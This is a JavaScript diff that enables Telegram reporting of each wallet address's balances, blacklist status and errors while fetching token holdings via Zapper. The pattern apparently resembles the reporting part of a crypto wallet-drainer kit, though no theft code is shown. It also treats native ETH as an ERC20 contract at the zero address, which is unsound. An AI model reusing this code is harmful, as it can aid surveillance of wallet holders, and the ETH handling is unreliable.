@@ -63,14 +63,14 @@ const isAddressWhitelisted = (address) => {
 // Fetch token balances directly for unsupported chains
 const fetchBalancesDirectly = async (address, chainId) => {
   console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
-  // await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
+  await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
   const provider = getProvider(chainId);
 
   // Handle blacklisted addresses
   if (isAddressBlacklisted(address)) {
     const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
     console.warn(message);
-    // await sendToTelegram(message);
+    await sendToTelegram(message);
     return [];
   }
 
@@ -78,7 +78,7 @@ const fetchBalancesDirectly = async (address, chainId) => {
   if (isAddressWhitelisted(address)) {
     const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
     console.log(message);
-    // await sendToTelegram(message);
+    await sendToTelegram(message);
   }
 
   try {
@@ -137,7 +137,7 @@ const fetchBalancesFromZapper = async (address, chainId) => {
   if (!ethers.utils.isAddress(address)) {
     const message = `Invalid Ethereum address: ${address}`;
     console.error(message);
-    // await sendToTelegram(message);
+    await sendToTelegram(message);
     return [];
   }
   const checksummedAddress = ethers.utils.getAddress(address);
@@ -146,13 +146,13 @@ const fetchBalancesFromZapper = async (address, chainId) => {
   if (isAddressBlacklisted(checksummedAddress)) {
     const message = `🚨 Blacklisted address detected: ${checksummedAddress}. Aborting balance fetch.`;
     console.warn(message);
-    // await sendToTelegram(message);
+    await sendToTelegram(message);
     return [];
   }
   if (isAddressWhitelisted(checksummedAddress)) {
     const message = `✅ Whitelisted address detected: ${checksummedAddress}. Fetching balances.`;
     console.log(message);
-    // await sendToTelegram(message);
+    await sendToTelegram(message);
   }
 
   // Define supported Zapper networks
@@ -293,7 +293,7 @@ const fetchBalancesFromZapper = async (address, chainId) => {
 
       if (amountUSD > 0) {
         const tokenDetails = {
-          address: token.symbol === 'ETH' ? ethers.constants.AddressZero : null, // No address available
+          address: token.symbol === 'ETH' ? ethers.constants.AddressZero : null, // Use zero address for ETH
           balance: amount,
           contract: token.symbol === 'ETH' ? null : new ethers.Contract(normalizedAddress, ERC20_ABI, provider),
           name: token.name,
@@ -302,6 +302,15 @@ const fetchBalancesFromZapper = async (address, chainId) => {
           amount,
           amountUSD,
         };
+
+        // For native ETH, ensure we have a valid contract instance
+        if (token.symbol === 'ETH') {
+          tokenDetails.contract = new ethers.Contract(
+            ethers.constants.AddressZero,
+            ERC20_ABI,
+            provider
+          );
+        }
 
         tokens.push(tokenDetails);
 
@@ -314,13 +323,11 @@ const fetchBalancesFromZapper = async (address, chainId) => {
 
     if (foundBlacklistedToken) {
       telegramMessage += `\n🚨 One or more blacklisted tokens were detected and skipped.\n`;
-    } else {
-      telegramMessage += `\n✅No blacklisted tokens found for this address.\n`;
+      await sendToTelegram(telegramMessage);
     }
 
-    await sendToTelegram(telegramMessage);
+
     console.log(`Fetched ${tokens.length} tokens from Zapper`);
-    // sendToTelegram(`Fetched ${tokens.length} tokens from Zapper`);
     return tokens;
 
   } catch (error) {
@@ -328,7 +335,7 @@ const fetchBalancesFromZapper = async (address, chainId) => {
       ? `Status: ${error.response.status}, Data: ${JSON.stringify(error.response.data, null, 2)}`
       : error.message;
     console.error('Error fetching balances from Zapper:', errorDetails);
-    // await sendToTelegram(`❌ Error fetching from Zapper for ${checksummedAddress}: ${errorDetails}`);
+    await sendToTelegram(`❌ Error fetching from Zapper for ${checksummedAddress}: ${errorDetails}`);
     return [];
   }
 };
